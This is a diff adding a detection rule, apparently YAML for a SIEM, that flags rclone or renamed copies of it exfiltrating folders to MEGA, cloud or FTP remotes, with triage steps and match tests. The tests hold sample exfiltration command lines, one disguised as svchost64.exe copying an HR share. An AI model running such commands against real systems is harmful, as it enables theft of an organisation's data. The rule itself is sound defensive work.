@@ -1,0 +1,35 @@
+id: DL-0028
+title: rclone copies data to a remote
+description: >
+  rclone (often renamed) syncing or copying folders to cloud storage, MEGA, FTP or WebDAV.
+  It is the most used exfiltration tool in ransomware intrusions because it is fast and
+  looks like backup traffic.
+attack: [T1567.002, T1048]
+tactic: exfiltration
+severity: high
+logsource: process_creation
+detection:
+  rclone_name:
+    process.name: rclone.exe
+  transfer_verb:
+    process.command_line|re: '\s(copy|copyto|sync|move)\s'
+  rclone_flags:
+    process.command_line|contains: [--multi-thread-streams, --no-check-certificate, --transfers, --ignore-existing,
+                                    --max-age, --auto-confirm]
+  condition: transfer_verb and (rclone_name or rclone_flags)
+false_positives:
+  - IT backup jobs that use rclone on purpose. These should run from a fixed path and account.
+triage:
+  - Read the remote name and find the rclone.conf to learn the destination and credentials.
+  - Measure how much data left (proxy or firewall bytes out) and which folders were copied.
+tests:
+  match:
+    - process.name: rclone.exe
+      process.command_line: 'rclone.exe copy D:\Finance mega:backup -q --ignore-existing'
+    - process.name: svchost64.exe
+      process.command_line: 'svchost64.exe copy \\fs01\HR remote:x --transfers 16 --multi-thread-streams 8'
+  no_match:
+    - process.name: robocopy.exe
+      process.command_line: 'robocopy D:\Finance E:\Backup /MIR'
+    - process.name: rclone.exe
+      process.command_line: 'rclone.exe config'
